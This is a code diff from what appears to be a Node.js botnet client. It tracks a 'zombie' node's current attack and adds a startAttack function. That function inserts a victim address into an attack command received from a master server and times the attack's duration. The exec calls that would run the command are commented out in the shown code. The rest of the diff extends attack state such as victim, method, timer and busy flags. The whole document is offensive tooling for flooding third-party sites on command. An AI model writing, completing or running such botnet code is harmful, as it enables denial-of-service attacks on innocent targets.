@@ -7,6 +7,7 @@ const fs = require('fs')
 const axios = require('axios');
 const EventEmitter = require('events')
 const moment = require('moment')
+const delay = require('delay')
 let master = null
 var masterReachable = new EventEmitter()
 var settingIntegrity = new EventEmitter()
@@ -17,7 +18,10 @@ let zombie = {
     port: null,
     currentAttack: {
         victim: null,
-        doneby: null
+        doneby: null,
+        id: null,
+        timer: null,
+        method: null
     },
     init: Date.now(),
     busy: false,
@@ -116,10 +120,13 @@ settingIntegrity.on('true', () => {
                         if (fs.existsSync(methodfilename)) {
                             // path exists
                             console.log("exists:", methodfilename);
-                            //mainT(victim, timelimit)
-                            zombie.currentAttack.victim = req.params.attackID
+                            startAttack((resp.data), req.params.victim, req.params.time)
+                            zombie.currentAttack.victim = req.params.victim
+                            zombie.currentAttack.timer = req.params.time
+                            zombie.currentAttack.id = req.params.id
+                            zombie.currentAttack.method = resp.data
                             zombie.currentAttack.doneby = moment().add({ seconds: timelimit }).unix() * 1000
-                            machineBusy = true
+                            zombie.busy = true
                             res.send(200, { success: true, message: `Attacking ${victim} with TL ${timelimit}`, doneby: zombie.currentAttack.doneby })
                         } else {
                             console.log("DOES NOT exist:", methodfilename);
@@ -197,6 +204,33 @@ settingIntegrity.on('true', () => {
     }, 6000)
 });
 
+async function startAttack(methodData, victim, time) {
+    let command = (methodData.dictation).replace("$VICTIM", `http://${victim}`)
+    console.log(command);
+        /*exec(command, (err, stdout, stderr) => {
+        if (err) {
+            //some err occurred
+            console.error(err)
+        } else {
+            // the *entire* stdout and stderr (buffered)
+            console.log(`stdout: ${stdout}`);
+            console.log(`stderr: ${stderr}`);
+        }
+    });*/
+    await delay (time)
+    zombie.currentAttack = null
+    /*exec(`pkill -9 ${methodData.process}`, (err, stdout, stderr) => { //SHOULD USE KILLALL'S YOUNGER/OLDER THAN ARGUMENTS!
+        if (err) {
+            //some err occurred
+            console.error(err)
+        } else {
+            // the *entire* stdout and stderr (buffered)
+            console.log(`stdout: ${stdout}`);
+            console.log(`stderr: ${stderr}`);
+        }
+    });*/
+
+}
 
 /*
 
